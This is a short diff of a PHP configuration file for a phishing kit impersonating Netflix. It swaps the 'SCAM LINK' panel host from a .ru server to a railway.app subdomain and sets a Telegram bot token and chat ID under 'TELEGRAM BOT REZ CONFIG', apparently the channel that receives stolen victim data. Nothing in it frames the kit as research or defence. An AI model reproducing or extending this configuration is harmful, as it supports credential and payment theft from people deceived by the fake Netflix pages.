@@ -26,7 +26,7 @@ define("SCAM_NAME", 'NETFLIX');
 define("WEBSITE", 'https://netflix.com/');
 
 // SCAM LINK
-define("PANEL", 'http://srv243293.hoster-test.ru/ne/');
+define("PANEL", 'netflixonline-id1093-production.up.railway.app');
 // TELEGRAM BOT REZ CONFIG
 define("TOKEN", '8487334853:AAGPvUrYI4QWYNe1NpuxTCucFfrF3CM21UI');
 define("CHATID", '-5020792802');
